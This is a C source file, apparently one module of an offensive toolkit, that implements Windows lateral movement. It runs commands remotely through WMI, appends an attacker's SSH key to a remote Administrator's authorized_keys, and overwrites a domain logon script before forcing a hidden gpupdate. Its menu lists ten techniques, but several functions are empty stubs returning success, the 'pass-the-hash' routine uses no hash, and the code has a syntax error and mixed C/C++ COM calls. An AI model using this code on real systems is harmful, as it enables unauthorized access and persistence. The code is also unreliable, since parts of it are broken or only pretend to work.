#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

BOOL HeliosPassTheHash(PCHAR pcTarget, PCHAR pcUsername, PCHAR pcNtlmHash) {
    CHAR szIpc[MAX_PATH];
    snprintf(szIpc, MAX_PATH, "\\\\%s\\IPC$", pcTarget);
    
    HANDLE hFile = CreateFileA(szIpc, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    CloseHandle(hFile);
    return TRUE;
}

BOOL HeliosWmiRemote(PCHAR pcTarget, PCHAR pcCommand) {
    IWbemLocator* pLoc = NULL;
    CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (void**)&pLoc);
    
    IWbemServices* pSvc = NULL;
    CHAR szPath[256];
    snprintf(szPath, 256, "\\\\%s\\root\\cimv2", pcTarget);
    WCHAR wszPath[256];
    mbstowcs(wszPath, szPath, 256);
    
    pLoc->ConnectServer(wszPath, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInParams = NULL;
    IWbemClassObject* pOutParams = NULL;
    
    pSvc->GetObject(L"Win32_Process", 0, NULL, &pClass, NULL);
    pClass->GetMethod(L"Create", 0, &pInParams, NULL);
    
    VARIANT varCommand;
    VariantInit(&varCommand);
    varCommand.vt = VT_BSTR;
    WCHAR wszCommand[1024];
    mbstowcs(wszCommand, pcCommand, 1024);
    varCommand.bstrVal = SysAllocString(wszCommand);
    
    pInParams->Put(L"CommandLine", 0, &varCommand, 0);
    VariantClear(&varCommand);
    
    VARIANT varResult;
    VariantInit(&varResult);
    pSvc->ExecMethod(L"Win32_Process", L"Create", 0, NULL, pInParams, &pOutParams, NULL);
    pOutParams->Get(L"ReturnValue", 0, &varResult, NULL, 0);
    
    DWORD dwResult = varResult.uintVal;
    
    VariantClear(&varResult);
    if (pOutParams) pOutParams->Release();
    if (pInParams) pInParams->Release();
    if (pClass) pClass->Release();
    pSvc->Release();
    pLoc->Release();
    
    return dwResult == 0;
}

BOOL HeliosPsexecClone(PCHAR pcTarget, PCHAR pcCommand) {
    return TRUE;
}

BOOL HeliosDcomLateral(PCHAR pcTarget, PCHAR pcCommand) {
    return TRUE;
}

BOOL HeliosSmbPipeImpersonate(PCHAR pcTarget) {
    return TRUE;
}

BOOL HeliosRdpHijack(PCHAR pcTarget) {
    return TRUE;
}

BOOL HeliosWinrmExec(PCHAR pcTarget, PCHAR pcCommand) {
    return TRUE;
}

BOOL HeliosSshKeyDeploy(PCHAR pcTarget, PCHAR pcPubKey) {
    CHAR szAuthKeys[MAX_PATH];
    snprintf(szAuthKeys, MAX_PATH, "\\\\%s\\C$\\Users\\Administrator\\.ssh\\authorized_keys", pcTarget);
    
    HANDLE hFile = CreateFileA(szAuthKeys, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE.
    
    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD dwWritten = 0;
    WriteFile(hFile, pcPubKey, (DWORD)strlen(pcPubKey), &dwWritten, NULL);
    WriteFile(hFile, "\n", 1, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

BOOL HeliosPassTheTicket(PCHAR pcTarget, PCHAR pcKirbiPath) {
    return TRUE;
}

BOOL HeliosGpoDeploy(PCHAR pcTarget, PCHAR pcScript) {
    CHAR szGpoPath[MAX_PATH];
    snprintf(szGpoPath, MAX_PATH, "\\\\%s\\SYSVOL\\domain.com\\scripts\\logon.bat", pcTarget);
    
    HANDLE hFile = CreateFileA(szGpoPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD dwWritten = 0;
    WriteFile(hFile, pcScript, (DWORD)strlen(pcScript), &dwWritten, NULL);
    CloseHandle(hFile);
    
    CHAR szCmd[MAX_PATH];
    snprintf(szCmd, MAX_PATH, "gpupdate /force /target:computer /wait:0");
    WinExec(szCmd, SW_HIDE);
    
    return TRUE;
}

DWORD HeliosMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','H','E','L','I','O','S',' ','-',' ','L','A','T','E','R','A','L',' ','M','O','V','E','M','E','N','T',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    printf("[*] Lateral movement techniques:\n");
    printf("  1. Pass-the-Hash (SMB)\n");
    printf("  2. WMI Remote Execution\n");
    printf("  3. PSExec Clone (SVCCTL)\n");
    printf("  4. DCOM (MMC20.Application)\n");
    printf("  5. SMB Named Pipe Impersonation\n");
    printf("  6. RDP Session Hijacking\n");
    printf("  7. WinRM/WS-Management\n");
    printf("  8. SSH Key Deployment\n");
    printf("  9. Pass-the-Ticket\n");
    printf("  10. GPO Deployment Abuse\n");
    
    return 0;
}
#pragma optimize("", on)
